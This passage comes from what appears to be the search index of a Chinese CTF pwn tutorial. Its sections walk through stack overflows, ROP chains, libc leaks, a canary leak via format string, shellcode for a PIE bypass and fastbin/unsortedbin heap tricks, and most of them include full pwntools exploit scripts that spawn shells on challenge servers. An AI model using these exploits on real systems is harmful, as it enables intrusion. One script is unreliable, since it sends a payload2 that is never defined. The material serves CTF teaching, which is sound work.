p64(bank_addr) + p64(leave)\n\nr.send(payload)\nr.recvuntil('now!')\n\npayload = p64(ret) * 28 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)\n\nr.send(payload)\nr.recvline()\n\nputs_addr = u64(r.recv(6).ljust(8,b'\\x00'))\nprint(hex(puts_addr))\n\nlibc = LibcSearcher('puts',puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\n\none_gadget = libc_base + 0x4526a\n\npayload = b'a' * (0x60 + 8) + p64(one_gadget)\n\nr.send(payload)\nr.interactive()\n</code></pre>"},{"location":"Pwn/Chapter4/4-14/","title":"Write \u6cc4\u9732 Libc \u7ed3\u5408 .so \u6587\u4ef6","text":""},{"location":"Pwn/Chapter4/4-14/#write-\u6cc4\u9732-libc-\u7ed3\u5408-so-\u6587\u4ef6","title":"Write \u6cc4\u9732 Libc \u7ed3\u5408 .so \u6587\u4ef6","text":"<p>\u4ee3\u7801\u5f88\u7b80\u5355</p> <p></p> <p>\u4f46\u662f\u8fd9\u9898\u7ed9\u51fa\u4e86 <code>.so</code> \u6587\u4ef6\uff0c\u90a3\u6211\u4eec\u5c31\u8981\u5229\u7528\u8fd9\u4e2a\u6587\u4ef6\u53bb\u7b97 <code>libc</code></p> <pre><code>from pwn import *\n\nelf = ELF('./level3')\nlibc = ELF('./libc_32.so.6')\nwrite_plt = elf.plt['write']\nwrite_got = elf.got['write']\nmain_addr = elf.symbols['main']\nsh = remote('111.198.29.45',30808)\n\npayload0 = b'a' * 140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)\n\nsh.sendlineafter(\"Input:\\n\",payload0)\n\n# \u5f97\u5230 write \u51fd\u6570\u7684\u771f\u5b9e\u5730\u5740\uff0c32 \u4f4d\u6536\u5230\u7684\u5305\u957f 4 \u4f4d\uff0c\u6240\u4ee5\u7528[:4]\nwrite_got_addr = u32(sh.recv()[:4])\n\n# \u8ba1\u7b97 libc \u52a0\u8f7d\u7684\u57fa\u5730\u5740\nlibc_addr = write_got_addr - libc.symbols['write']\n# \u8ba1\u7b97 system \u51fd\u6570\u771f\u5b9e\u5730\u5740\nsys_addr = libc_addr + libc.symbols['system']\n# \u8ba1\u7b97 /bin/sh \u771f\u5b9e\u5730\u5740\uff0c\u8fd9\u4e2a 0x15902b \u5c31\u662f /bin/sh \u5728 libc \u4e2d\u7684\u504f\u79fb\u91cf\nbin_sh_addr = libc_addr + 0x15902b\n\npayload1 = b'a' * 140 + p32(sys_addr) + p32(0x1234) + p32(bin_sh_addr)\n\nsh.sendline(payload2)\nsh.interactive()\n</code></pre>"},{"location":"Pwn/Chapter4/4-15/","title":"\u6cc4\u9732\u6808\u5730\u5740\u7ed5\u8fc7 PIE","text":""},{"location":"Pwn/Chapter4/4-15/#\u6cc4\u9732\u6808\u5730\u5740\u7ed5\u8fc7-pie","title":"\u6cc4\u9732\u6808\u5730\u5740\u7ed5\u8fc7 PIE","text":"<p>\u6ca1\u5f00 NX \u4f46\u662f\u5f00\u4e86 PIE</p> <p></p> <p>\u53cd\u7f16\u8bd1\u7a0b\u5e8f\u53d1\u73b0\u5f00\u59cb\u5c31\u4f1a\u7ed9\u6211\u4eec\u6808\u521d\u59cb\u5730\u5740</p> <p></p> <p>\u770b\u770b\u6808\u5927\u5c0f</p> <p></p> <p>\u4e0a\u811a\u672c</p> <pre><code>from pwn import *\n\np = remote(\"challenge.qsnctf.com\",31587)\ncontext(arch = 'amd64', os = 'linux')\nshellcode = asm(shellcraft.sh())\n\n# \u5148\u63a5\u6536\u5730\u5740\nv4 = int(p.recv(14),16)\n\n# \u586b\u5145\u5783\u573e\u6570\u636e\u5230 r \u5904\uff0c\u8fd4\u56de\u5730\u5740\u4e3a\u6808\u521d\u59cb\u5730\u5740\npayload = shellcode.ljust(264, b'a') + p64(v4)\n\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter4/4-2/","title":"Scanf \u7ed5\u8fc7\u6cc4\u9732 Libc","text":""},{"location":"Pwn/Chapter4/4-2/#scanf-\u7ed5\u8fc7\u6cc4\u9732-libc","title":"Scanf \u7ed5\u8fc7\u6cc4\u9732 Libc","text":"<p>\u4e3b\u8981\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\n#define BUF_SIZE 0x100\n\nint get_size() {\n  int size = 0;\n  scanf(\"%d%*c\", &amp;size);\n  return size;\n}\n\nvoid get_hex(char *buf, unsigned size) {\n  for (unsigned i = 0; i &lt; size; i++)\n    scanf(\"%02hhx\", buf + i);\n}\n\nvoid hexecho() {\n  int size;\n  char buf[BUF_SIZE];\n\n  // Input size\n  printf(\"Size: \");\n  size = get_size();\n\n  // Input data\n  printf(\"Data (hex): \");\n  get_hex(buf, size);\n\n  // Show data\n  printf(\"Received: \");\n  for (int i = 0; i &lt; size; i++)\n    printf(\"%02hhx \", (unsigned char)buf[i]);\n  putchar('\\n');\n}\n\nint main() {\n  setbuf(stdin, NULL);\n  setbuf(stdout, NULL);\n  hexecho();\n  return 0;\n}\n</code></pre> <p><code>%02hhx</code> \u4f1a\u8bfb\u53d6**\u6700\u591a2\u4e2a\u5341\u516d\u8fdb\u5236\u5b57\u7b26**\uff0c\u9047\u5230\u975e\u5341\u516d\u8fdb\u5236\u5b57\u7b26\uff08\u5982\u7a7a\u683c\uff09\u65f6\u505c\u6b62</p> <p>\u53ef\u4ee5\u53c2\u8003 3.1 \u90a3\u4e00\u8282\uff0c\u6211\u4eec\u8fd9\u6b21\u8f93\u5165\u6570\u636e\u8981\u8f6c\u4e3a\u5341\u516d\u8fdb\u5236\u6570</p> <p>\u4f46\u662f\u5c11\u4e86\u540e\u95e8\u51fd\u6570\uff0c\u9644\u4ef6\u8fd8\u7ed9\u4e86 libc.so \u6587\u4ef6\uff0c\u63a8\u6d4b\u8981\u6cc4\u9732 libc \u57fa\u5740</p> <p>\u67e5\u770b\u7f13\u51b2\u533a\u5927\u5c0f</p> <p></p> <p>\u5982\u679c\u7ed9\u51fa\u4e00\u4e2a\u975e\u5341\u516d\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\uff0cscanf \u5c06\u5931\u8d25\uff0c\u5b57\u7b26\u540e\u9762\u7684\u4efb\u4f55\u5b57\u7b26\u90fd\u5c06\u88ab\u5ffd\u7565\u5e76\u4e14 for \u8bed\u53e5\u53ef\u4ee5\u7ee7\u7eed</p> <p>\u7f13\u51b2\u533a\u5230 r \u5904\u662f 280 \u5b57\u8282\uff0c\u6211\u4eec\u9700\u8981\u5728 279 \u5b57\u8282\u5904\u8f93\u5165\u6b63\u5e38\u6570\u503c\uff0c\u4e0d\u7136 r \u5904\u4e00\u6837\u4f1a\u88ab\u5ffd\u7565</p> <pre><code>from ptrlib import *\n\np = Socket('34.170.146.252', 51786)\ne = ELF('./hexecho_patched')\nlibc = ELF('./libc.so.6')\n\n# \u5c06\u4e00\u4e2a\u5730\u5740\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\uff0c\u5e76\u6309\u4e24\u4e2a\u5b57\u7b26\u5206\u9694\u8f93\u51fa\ndef to_hex(addr):\n    print(hex(addr))\n    h = p64(addr).hex()\n    return ' '.join([h[i:i+2] for i in range(0, len(h), 2)])\n\np.sendlineafter('Size: ', 280 + 16)\np.recvuntil('Data (hex): ')\n\nfor i in range(279):\n    p.send(b'+')\n\np.send('22 ')\n\n# e.gadget('ret;') \u67e5\u627e\u4e0b\u4e00\u4e2a \u201cret;\u201d\np.sendline(to_hex(next(e.gadget('ret;'))))\n\n# \u83b7\u53d6 main \u51fd\u6570\u7684\u5730\u5740\np.sendline(to_hex(e.symbol('main')))\n\n# \u83b7\u53d6 Libc \u57fa\u5740\nrecv = p.recvlineafter('Received: ').split()\nidx = recv.index(b'7f')\nofs = int(b''.join(recv[idx-5:idx+1][::-1]).decode(), 16)\nlibc.base = ofs - 0x7f7117a5c780 + 0x7f7117841000\n\np.sendlineafter('Size: ', 280 + 8 * 4)\np.recvuntil('Data (hex): ')\n\nfor i in range(279):\n    p.send(b'+')\n\np.send('22 ')\n\np.sendline(to_hex(next(e.gadget('ret;'))))\n\n# \u67e5\u627e\u5e76\u53d1\u9001 pop rdi; ret;\np.sendline(to_hex(next(libc.gadget('pop rdi; ret;'))))\np.sendline(to_hex(next(libc.find(b'/bin/sh'))))\np.sendline(to_hex(libc.symbol('system')))\n\nr = p.recvlineafter('Received: ')\n\np.interactive()\n</code></pre> <p>\u8fd0\u884c\u811a\u672c\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter4/4-3/","title":"Strlen \u7ed5\u8fc7\u6cc4\u9732 Libc","text":""},{"location":"Pwn/Chapter4/4-3/#strlen-\u7ed5\u8fc7\u6cc4\u9732-libc","title":"Strlen \u7ed5\u8fc7\u6cc4\u9732 Libc","text":"<p>\u5982\u679c\u4e0d\u662f 2 \u5219\u8c03\u7528 begin\uff0c\u53bb\u770b\u770b begin \u53d1\u73b0\u7ed9\u4e86\u4e09\u4e2a\u9009\u62e9</p> <p></p> <p>\u4e0b\u9762\u8fd8\u6709\u4e2a\u4e0d\u662f 1 \u7684\u5224\u65ad\uff0c\u591a\u8c03\u7528\u4e86\u4e00\u4e2a encrypt\uff0c\u770b\u6765\u8981\u8f93\u5165 2</p> <p>\u8fdb\u53bb\u76f4\u63a5\u7ed9\u51fa\u4e86 gets\uff0c\u5de6\u95e8 plt \u8868\u4e2d\u6709 puts\uff0c\u6ca1\u6709\u540e\u95e8\u51fd\u6570\u53ca\u5b57\u7b26\u4e32\uff0c\u770b\u6765\u8981\u5148\u6cc4\u9732 libs</p> <p>\u4f46\u662f strlen \u51fd\u6570\u5728\u4e00\u4e2a\u6b7b\u5faa\u73af\u91cc\u9762\uff0c\u5b83\u4f1a\u4fee\u6539\u6211\u4eec\u6570\u636e\uff0c\u5f97 \\x00 \u622a\u65ad\u7ed5\u8fc7</p> <p>\u7136\u540e\u901a\u8fc7 puts \u6253\u5370\u51fa puts \u5b9e\u9645\u5728 libc \u4e2d\u7684\u5730\u5740</p> <p></p> <p>\u67e5\u770b\u7f13\u51b2\u533a\u5927\u5c0f</p> <p></p> <p>\u5148\u83b7\u53d6 pop rdi \u53ca ret \u5730\u5740</p> <p></p> <p>\u6784\u9020 payload</p> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn',26156)\n\nelf = ELF('./ciscn_2019_en_2')\npop_rdi = 0x400c83\nret = 0x4006b9\ncode = 0x4009a0\nputs_got=elf.got['puts']\nputs_plt=elf.plt['puts']\n\np.recvuntil('choice!\\n')\np.sendline(str(1))\np.recvuntil('encrypted\\n')\n\npayload = b'\\x00' + b'a' * 0x57 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(code)\np.sendline(payload)\np.recvuntil('Ciphertext\\n\\n')\n\nputs_add = u64(p.recv(6).ljust(8,b'\\x00'))\n\nsystem = puts_add - 0x31580\nbinsh = puts_add + 0x1334da\n\np.recvuntil('encrypted\\n')\n\npayload = b'\\x00' + b'a' * 0x57 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)\n\np.sendline(payload)\np.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter4/4-4/","title":"Write \u6cc4\u9732 Libc","text":""},{"location":"Pwn/Chapter4/4-4/#write-\u6cc4\u9732-libc","title":"Write \u6cc4\u9732 Libc","text":"<p>\u660e\u663e\u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u4f46\u662f\u6ca1\u6709\u7ed9\u51fa system \u53ca /bin/sh\uff0c\u9700\u8981\u6cc4\u9732 libc</p> <p></p> <p>plt \u8868\u4e2d\u7ed9\u51fa\u4e86 write\uff0c\u53ef\u4ee5\u8c03\u7528 write \u51fd\u6570\u6253\u5370 write \u51fd\u6570\u5b9e\u9645\u5728 libc \u4e2d\u7684\u5730\u5740</p> <p></p> <p>\u6784\u9020 payload</p> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn',27605)\nelf = ELF('./2018_rop')\n\nwrite_got = elf.got['write']\nwrite_plt = elf.plt['write']\nmain = 0x080484c6\n\npayload = b'a' * 0x8c + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(0x20)\n\np.sendline(payload)\nwrite_add=u32(p.recv(4))\n\nsystem = write_add - 0xa89e0\nbinsh = write_add + 0x961df\n\npayload = b'a' * 0x8c + p32(system) + p32(0) + p32(binsh)\n\np.sendline(payload)\np.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter4/4-5/","title":"Printf \u6cc4\u9732 Libc","text":""},{"location":"Pwn/Chapter4/4-5/#printf-\u6cc4\u9732-libc","title":"Printf \u6cc4\u9732 Libc","text":"<p>\u4ee3\u7801\u5f88\u7b80\u5355</p> <p></p> <p>read \u7684\u5927\u5c0f\u662f 0x100\uff0c\u660e\u663e\u8d85\u8fc7\u4e86 buf \u5b58\u5728\u6ea2\u51fa</p> <p></p> <p>\u6ca1\u6709\u53ef\u5229\u7528\u5b57\u7b26\u4e32\u53ca\u540e\u95e8\u51fd\u6570\uff0c\u9700\u8981\u6cc4\u9732 libc \u6784\u9020 ROP</p> <p>\u4f7f\u7528 printf \u6cc4\u9732\u65f6\u9700\u8981\u7528\u5230\u4e24\u4e2a\u53ca\u4ee5\u4e0a\u7684\u53c2\u6570</p> <pre><code>int printf(const char *format, ...);\n</code></pre> <p>\u5148\u53bb\u627e pop rdi;</p> <p></p> <p>\u53c2\u8003 1.7 64 \u4f4d ROP \u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u9700\u8981\u7528\u5230 rsi \u5bc4\u5b58\u5668\uff0c\u7ee7\u7eed\u53bb\u627e</p> <p></p> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\u5fc5\u987b\u5e26\u6709\u767e\u5206\u53f7\uff0c\u53bb\u5229\u7528\u73b0\u6210\u7684\u5b57\u7b26\u4e32</p> <p></p> <p>\u6784\u9020 payload</p> <pre><code>from pwn import *\nfrom LibcSearcher import *\n\np = remote('node5.buuoj.cn',29562)\nelf = ELF('babyrop2')\n\npop_rdi = 0x0000000000400733\npop_rsi_r15 = 0x0000000000400731 \nformat_str = 0x0000000000400770  \nret_addr = 0x0000000000400734\n\nprintf_plt = elf.plt['printf']\nread_got = elf.got['read']\nmain_plt = elf.sym['main']\n\npayload = b'a' * 0x28 + p64(pop_rdi) + p64(format_str) + p64(pop_rsi_r15) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main_plt)\n\np.recvuntil(\"name? \")\np.sendline(payload)\n\n# \u63a5\u6536\u5730\u5740\u57fa\u672c\u4e0a\u90fd\u662f 7 \u4e2a\u5b57\u8282\u7684\uff0c7f \u5f00\u5934\uff0c\u8865\u5168 8 \u4e2a\u5b57\u8282\nread_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\n\nlibc = LibcSearcher('read', read_addr)\nlibc_base = read_addr - libc.dump('read')\nsys_addr = libc_base + libc.dump('system')\nbin_sh = libc_base + libc.dump('str_bin_sh')\n\npayload = b'a' * 0x28 + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)\n\np.sendline(payload)\np.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter4/4-6/","title":"Printf  \u6307\u5b9a\u5730\u5740\u6cc4\u9732 Canary","text":""},{"location":"Pwn/Chapter4/4-6/#printf-\u6307\u5b9a\u5730\u5740\u6cc4\u9732-canary","title":"Printf  \u6307\u5b9a\u5730\u5740\u6cc4\u9732 Canary","text":"<p>\u5148 checksec \u4e00\u4e0b\u53d1\u73b0\u5f00\u542f\u4e86 Canary \u53ca NX</p> <p></p> <p>\u53cd\u7f16\u8bd1\u5148\u770b main \u51fd\u6570</p> <p></p> <p>\u9996\u5148\u8c03\u7528\u4e86 init \u51fd\u6570\u6253\u5370\u4e86\u4e24\u53e5\u8bdd</p> <p></p> <p>\u518d\u662f gift \u51fd\u6570\uff0c\u8fd9\u91cc\u660e\u663e\u5b58\u5728\u5b57\u7b26\u4e32\u683c\u5f0f\u5316\u6f0f\u6d1e</p> <p></p> <p>\u6700\u540e\u662f vuln \u51fd\u6570</p> <p></p> <p>buf \u7f13\u51b2\u533a\u5b58\u5728\u6ea2\u51fa</p> <p></p> <p>\u5c1d\u8bd5\u5e38\u89c4\u65b9\u6cd5\u6cc4\u9732\u4f46\u4e0d\u884c</p> <p></p> <p>\u8f93\u5165 %n$p\uff08\u7528\u6cd5\u53c2\u8003 2.1\uff09</p> <p>\u53ef\u4ee5\u770b\u5230\u504f\u79fb\u662f 6</p> <p></p> <p>\u4f7f\u7528 gdb \u8c03\u8bd5\u53d1\u73b0\u5728\u5b57\u7b26\u4e32\u4e0b\u9762\u4e00\u884c\u5c31\u662f Canary \u7684\u503c</p> <p></p> <p>\u6240\u4ee5\u8f93\u5165 %7$p \u5c31\u80fd\u6cc4\u9732 Canary \u7684\u503c</p> <p></p> <p></p> <p>64 \u4f4d\u7cfb\u7edf\u8fd8\u9700\u8981\u4e00\u4e2a pop rdi;ret</p> <p></p> <p>Canary \u4fdd\u62a4\u4f1a\u4ece rbp-4 \u6216\u8005 rbp-8 \u7684\u4f4d\u7f6e\u53d6\u51fa\u5e76\u4e0e fs/gs \u5bc4\u5b58\u5668\u5bf9\u5e94\u4f4d\u7f6e\u7684\u503c\u8fdb\u884c\u6bd4\u8f83</p> <p>\u5982\u679c\u4e0d\u76f8\u7b49\u5c31\u4f1a\u6267\u884c __ stack_chk_fail \u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5f3a\u884c\u505c\u6b62\u7a0b\u5e8f\u8fd0\u884c\u5e76\u53d1\u51fa\u8b66\u544a\uff0c\u4ece\u800c\u963b\u6b62\u6808\u6ea2\u51fa\u653b\u51fb</p> <p>\u6240\u4ee5\u5728\u6700\u540e\u586b\u4e0a Canary \u7684\u503c\u6765\u7ed5\u8fc7</p> <pre><code>from pwn import *\nfrom LibcSearcher import *\n\nr = remote('node3.buuoj.cn',26842)\nelf = ELF('./bjdctf_2020_babyrop2')\n\npayload = '%7$p'\n\nr.sendline(payload)\nr.recvuntil('0x')\n\ncancry = int(r.recv(16),16)\n\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\npop_rdi = 0x0400993\nmain_addr = elf.symbols['main']\nvuln_addr = 0x0400887\n\n# 'a' * (0x20 - 8) + p64(cancry)\uff1a\u7ed5\u8fc7 cancry\n# p64(0)\uff1a\u8986\u76d6 ebp\npayload = b'a' * (0x20 - 8) + p64(cancry) + p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)\n\nr.recvuntil('story!\\n')\nr.sendline(payload)\n\nputs_addr = u64(r.recv(6).ljust(8, b'\\x00'))\nlibc = LibcSearcher('puts', puts_addr)\nbase_addr = puts_addr - libc.dump('puts')\nsystem_addr = base_addr + libc.dump('system')\nshell_addr = base_addr + libc.dump('str_bin_sh')\n\nr.recvuntil('story!\\n')\n\npayload = b'a' * (0x20 - 8) + p64(cancry) + p64(0) + p64(pop_rdi) + p64(shell_addr) + p64(system_addr) + p64(main_addr)\n\nr.sendline(payload)\nr.interactive()\n</code></pre>"},{"location":"Pwn/Chapter4/4-7/","title":"Unsortedbin Attack \u6cc4\u9732 Libc","text":""},{"location":"Pwn/Chapter4/4-7/#unsortedbin-attack-\u6cc4\u9732-libc","title":"Unsortedbin Attack \u6cc4\u9732 Libc","text":"<p>\u5148 checksec \u4e00\u4e0b\u53d1\u73b0\u4fdd\u62a4\u5168\u5f00</p> <p></p> <p>\u7b80\u5355\u6ce8\u91ca\u4e00\u4e0b\u529f\u80fd</p> <p></p> <p>\u5728\u7f16\u8f91\u51fd\u6570\u4e2d\u5b58\u5728\u6ea2\u51fa</p> <p></p> <p>\u5229\u7528\u601d\u8def\uff1a</p> <ol> <li>\u4e24\u6b21 double free \u4e0e fastbin attack</li> <li>\u7b2c\u4e00\u6b21\u5148\u6cc4\u9732 libc \u5730\u5740\uff0c\u7136\u540e\u627e\u5230\u6784\u9020 fake chunk \u7684\u5730\u5740</li> <li>\u7b2c\u4e8c\u6b21\u901a\u8fc7\u6784\u9020\u7684 fake chunk \u5806\u6ea2\u51fa\u8986\u5199 __malloc_hook \u5b8c\u6210 get shell</li> </ol> <p>\u9996\u5148\u901a\u8fc7 unsortedbin attack  \u6765\u6cc4\u9732 libc \u5730\u5740</p> <p>\u5e94\u8be5\u8bb0\u4f4f\u8fd9\u6837\u4e00\u6761\u89c4\u5f8b\uff1a\u5f53 small chunk \u88ab\u91ca\u653e\u65f6\uff0c\u5b83\u7684 fd\u3001bk \u6307\u5411\u4e00\u4e2a\u6307\u9488\uff0c\u8fd9\u4e2a\u6307\u9488\u6307\u5411 top chunk \u5730\u5740</p> <p>\u8fd9\u4e2a\u6307\u9488\u4fdd\u5b58\u5728 main_arena \u7684 0x58 \u504f\u79fb\u5904\uff0c\u800c main_arena \u662f libc \u7684 data \u6bb5\u4e2d\uff0c\u662f\u5168\u5c40\u9759\u6001\u53d8\u91cf\uff0c\u6240\u4ee5\u504f\u79fb\u4e5f\u662f\u56fa\u5b9a\u7684</p> <p>\u6839\u636e\u8fd9\u4e9b\u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa libc \u7684\u57fa\u5730\u5740\u4e86\uff0c\u6240\u4ee5\u91cd\u70b9\u662f\u5f53 small chunk \u91ca\u653e\u65f6\uff0c\u80fd\u8bfb\u51fa fd \u6216\u8005 bk \u7684\u503c</p>"},{"location":"Pwn/Chapter4/4-7/#1-\u5806\u5185\u5b58\u7ba1\u7406\u7b80\u4ecb","title":"1. \u5806\u5185\u5b58\u7ba1\u7406\u7b80\u4ecb","text":"<p>\u5728 Linux \u7cfb\u7edf\u4e2d\uff0cglibc \u4f7f\u7528 ptmalloc2 \u4f5c\u4e3a\u9ed8\u8ba4\u7684\u5185\u5b58\u5206\u914d\u5668</p> <p>ptmalloc2 \u901a\u8fc7\u7ef4\u62a4\u591a\u4e2a bin\uff08\u5982 fastbin\u3001small bin\u3001unsorted bin\u3001large bin \u7b49\uff09\u6765\u7ba1\u7406\u5806\u5185\u5b58</p> <p>\u6bcf\u4e2a bin \u7528\u4e8e\u7ba1\u7406\u4e0d\u540c\u5927\u5c0f\u7684\u5185\u5b58\u5757\uff08chunk\uff09</p>"},{"location":"Pwn/Chapter4/4-7/#2-unsorted-bin-\u548c-small-chunk","title":"2. unsorted bin \u548c small chunk","text":"<ul> <li>unsorted bin\uff1a\u5f53\u5185\u5b58\u5757\u88ab\u91ca\u653e\u65f6\uff0c\u5982\u679c\u4e0d\u662f fastbin \u5927\u5c0f\uff0c\u5b83\u9996\u5148\u4f1a\u88ab\u653e\u5165 unsorted bin\uff0cunsorted bin \u662f\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff0c\u7528\u4e8e\u4e34\u65f6\u5b58\u653e\u91ca\u653e\u7684\u5185\u5b58\u5757\uff0c\u7b49\u5f85\u540e\u7eed\u7684\u5206\u914d\u6216\u5408\u5e76</li> <li>small chunk\uff1asmall chunk \u662f\u6307\u5927\u5c0f\u5c0f\u4e8e 512 \u5b57\u8282\uff0832 \u4f4d\u7cfb\u7edf\uff09\u6216 1024 \u5b57\u8282\uff0864 \u4f4d\u7cfb\u7edf\uff09\u7684\u5185\u5b58\u5757\uff0csmall chunk \u88ab\u91ca\u653e\u540e\u4f1a\u8fdb\u5165 small bin \u6216 unsorted bin</li> </ul>"},{"location":"Pwn/Chapter4/4-7/#3-main_arena-\u548c-libc","title":"3. main_arena \u548c libc","text":"<ul> <li>main_arena\uff1a\u662f ptmalloc2 \u4e2d\u7528\u4e8e\u7ba1\u7406\u5806\u5185\u5b58\u7684\u4e3b\u8981\u7ed3\u6784\u4f53\uff0c\u5b83\u5305\u542b\u4e86\u5404\u79cd bin \u7684\u4fe1\u606f\uff0cmain_arena \u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5b58\u50a8\u5728 libc \u7684 data \u6bb5\u4e2d</li> <li>libc\uff1a\u662f Linux \u7cfb\u7edf\u4e2d\u7684 C \u6807\u51c6\u5e93\uff0c\u5305\u542b\u4e86\u5927\u91cf\u7684\u51fd\u6570\u5b9e\u73b0\uff0clibc \u7684\u57fa\u5730\u5740\u662f\u968f\u673a\u7684\uff08\u7531\u4e8e ASLR\uff0c\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316\uff09\uff0c\u4f46\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u662f\u56fa\u5b9a\u7684</li> </ul>"},{"location":"Pwn/Chapter4/4-7/#4-unsorted-bin-attack-\u6cc4\u9732-libc-\u5730\u5740","title":"4. unsorted bin attack \u6cc4\u9732 libc \u5730\u5740","text":"<p>\u5f53 small chunk \u88ab\u91ca\u653e\u65f6\uff0c\u5b83\u4f1a\u88ab\u653e\u5165 unsorted bin \u6216 small bin \u4e2d\uff0c\u6b64\u65f6\uff0cchunk \u7684 <code>fd</code> \u548c <code>bk</code> \u6307\u9488\u4f1a\u6307\u5411 main_arena \u4e2d\u7684\u67d0\u4e2a\u4f4d\u7f6e\uff0c\u5177\u4f53\u6765\u8bf4\uff1a</p> <ul> <li><code>fd</code> \u548c <code>bk</code> \u4f1a\u6307\u5411 main_arena \u4e2d\u7684\u4e00\u4e2a\u6307\u9488\uff0c\u8fd9\u4e2a\u6307\u9488\u6307\u5411 top chunk \u7684\u5730\u5740</li> <li>\u8fd9\u4e2a\u6307\u9488\u5728 main_arena \u4e2d\u7684\u504f\u79fb\u662f\u56fa\u5b9a\u7684\uff08\u4f8b\u5982\uff0c0x58 \u504f\u79fb\u5904\uff09</li> </ul> <p>\u7531\u4e8e main_arena \u662f libc \u4e2d\u7684\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5b83\u7684\u5730\u5740\u4e0e libc \u7684\u57fa\u5730\u5740\u6709\u4e00\u4e2a\u56fa\u5b9a\u7684\u504f\u79fb</p> <p>\u56e0\u6b64\uff0c\u5982\u679c\u6211\u4eec\u80fd\u591f\u8bfb\u53d6 small chunk \u7684 <code>fd</code> \u6216 <code>bk</code> \u6307\u9488\uff0c\u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa main_arena \u7684\u5730\u5740\uff0c\u8fdb\u800c\u8ba1\u7b97\u51fa libc \u7684\u57fa\u5730\u5740</p> <p>\u63d0\u53d6\u7533\u8bf7\u51e0\u4e2a\u5c0f\u5806\u5757</p> <pre><code>alloc(0x10)\nalloc(0x10)\nalloc(0x10)\nalloc(0x10)\nalloc(0x80)\n</code></pre> <p></p> <p>\u518d\u91ca\u653e\u6389\u4e24\u4e2a fast bin</p> <pre><code>free(1)\nfree(2)\n</code></pre> <p>\u8f93\u5165 bins \u67e5\u770b\u6240\u6709\u79cd\u7c7b\u7684\u5806\u5757\u7684\u94fe\u8868\u60c5\u51b5</p> <p></p> <p>LIFO \u662f fastbin \u7684\u4e00\u4e2a\u91cd\u8981\u7279\u6027\uff0c\u8868\u793a \u540e\u8fdb\u5148\u51fa\uff08Last In, First Out\uff09</p> <p>\u8fd9\u610f\u5473\u7740\uff1a</p> <ul> <li>\u5f53\u91ca\u653e\u4e00\u4e2a chunk \u5230 fastbin \u65f6\uff0c\u5b83\u4f1a\u88ab\u63d2\u5165\u5230\u94fe\u8868\u7684\u5934\u90e8</li> <li>\u5f53\u5206\u914d\u4e00\u4e2a chunk \u65f6\uff0c\u4f1a\u4ece\u94fe\u8868\u7684\u5934\u90e8\u53d6\u51fa\u6700\u8fd1\u91ca\u653e\u7684 chunk</li> </ul> <p>fastbin \u662f glibc \u4e2d\u7528\u4e8e\u7ba1\u7406\u5c0f\u5185\u5b58\u5757\uff08\u901a\u5e38\u5c0f\u4e8e 64 \u5b57\u8282\uff09\u7684\u4e00\u79cd bin</p> <p>fastbin \u662f\u4e00\u4e2a\u5355\u5411\u94fe\u8868\uff0c\u6bcf\u4e2a\u7a7a\u95f2 chunk \u901a\u8fc7 <code>fd</code> \u6307\u9488\u6307\u5411\u4e0b\u4e00\u4e2a\u7a7a\u95f2 chunk</p> <p>\u7531\u4e8e\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8986\u76d6\u540e\u8fb9\u7684\u5185\u5b58\u3002\u6211\u4eec\u628a chunk 2 \u7684\u5185\u5bb9\u8986\u76d6\u4e3a chunk 4 \u7684\u5730\u5740</p> <p>\u5c06\u5982\u56fe\u6807\u8bb0\u5904\u4fee\u6539\u4e3a chuk4 \u7684\u5730\u5740\uff0c\u53ea\u7528\u4fee\u6539\u4f4e 8 \u5b57\u8282\u5373\u53ef</p> <p></p> <pre><code># +-------------------+-------------------+-------------------+-------------------+\n# |   Chunk 0 (idx=0) |   Chunk 1 (idx=1) |   Chunk 2 (idx=2) |   Chunk 3 (idx=3) |\n# +-------------------+-------------------+-------------------+-------------------+\npayload = p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21) + p8(0x80)\n\nfill(0, payload)\n</code></pre> <p>\u4fee\u6539\u540e</p> <p></p> <p>\u73b0\u5728 chunk2 \u7684 fd \u6307\u5411\u4e86 chunk4\uff0c\u8fd9\u6837\u76f8\u5f53\u4e8e chunk 4 \u5df2\u7ecf\u88ab free \u4e86\u800c\u4e14\u88ab\u5b58\u653e\u5728 fastbin \u4e2d</p> <p></p> 